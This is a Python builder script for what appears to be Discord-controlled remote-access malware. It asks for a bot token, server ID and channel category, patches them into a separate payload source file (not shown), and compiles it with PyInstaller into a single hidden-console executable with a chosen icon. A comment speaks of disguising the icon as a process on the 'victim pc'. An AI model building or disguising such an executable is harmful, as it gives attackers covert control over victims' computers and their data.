import subprocess
import sys
import os
import shutil

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def create_cache(TOKEN, SERVER_ID, CATEGORY_ID):
    with open("main-developer.py", "r", encoding="utf-8") as f:
        data = f.readlines()

    # lines that requires string input:
    ltrsi = [72]
    data[ltrsi[0]-1] = data[ltrsi[0]-1].replace("''", f"'{TOKEN}'") # very ugly, very nice xD

    # lines that requires integer input:
    ltrii = [73, 74]
    config = [SERVER_ID, CATEGORY_ID]
    for i in range(len(ltrii)):
        data[ltrii[i]-1] = data[ltrii[i]-1].replace("0", f"{config[i]}") # very ugly, very nice xD

    # lines that need to indent once
    data[28-1] = "    " + data[28-1]

    # lines that need to indent three times:
    for i in range(72, len(data)+1):
        line = data[i-1]
        if line != "\n":
            data[i-1] = "            " + line

    # lines that need to be uncomment:
    for i in range(23, 28):
        line = data[i-1]
        data[i-1] = line[1:]
    for i in range(32, 61):
        line = data[i-1]
        data[i-1] = line[1:]
    for i in range(63, 72):
        line = data[i-1]
        data[i-1] = line[1:]

    # lines that need to be deleted:
    ltntbd = [22, 30, 31, 61, 62, 76, 86, 106, 113, 147, 153, 181, 234, 511, 597]
    for i in range(0, len(ltntbd)):
        data.pop(ltntbd[i]-(i+1))

    with open("cache.py", "w", encoding="utf-8") as f:
        for line in data:
            f.write(line)


def build(TOKEN, SERVER_ID, CATEGORY_ID, ICON):
    if ICON == "":
        ICON = "icon.ico"
    create_cache(TOKEN, SERVER_ID, CATEGORY_ID)
    build_command = f"pyinstaller --clean --onefile --noconsole --icon={ICON} cache.py --add-data=seedir\\*:seedir"
    subprocess.check_call(build_command, shell=True)
    os.remove("cache.py")
    os.remove("cache.spec")
    shutil.rmtree("./build")


def interrogate_i_mean_ask(message, datatype):
    value = None
    while True:
        value = input(f"Enter your {message}: ")
        if value:
            try:
                if datatype == "str":
                    str(value)
                elif datatype == "int":
                    int(value)
                break
            except ValueError:
                print(f"Please enter a valid {message}")
        else:
            print(f"Please enter a valid {message}")

    return value

os.system('cls' if os.name == 'nt' else 'clear')

result = subprocess.run(['pip', 'freeze'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
installed_packages = result.stdout.split('\n')
with open("requirements.txt", 'r', encoding="utf-8") as f:
    necessary_packages = f.readlines()

for necessary in necessary_packages:
    necessary = necessary.rstrip('\n')
    print(f"Checking if {necessary} is installed...")
    if any(necessary in installed.lower() for installed in installed_packages):
        continue
    else:
        response = input(f"{necessary} isn't installed. Install?(y/no): ")
        while True:
            if response == 'y':
                install(necessary)
                break
            elif response == 'no':
                print("ok..")
                input("Press Enter to Exit")
                quit()

print('\n')
token = interrogate_i_mean_ask("token", str)
guild_id = interrogate_i_mean_ask("server ID", int)
category_id = interrogate_i_mean_ask("category ID (This is for creating channel)", int)
# leave blank to set as victim pc's process  TODO: achieve this function
icon = str(input("Enter icon path ( leave blank to set as icon.ico ): "))

build(token, guild_id, category_id, icon)
print("Build done, .exe is in dist folder")
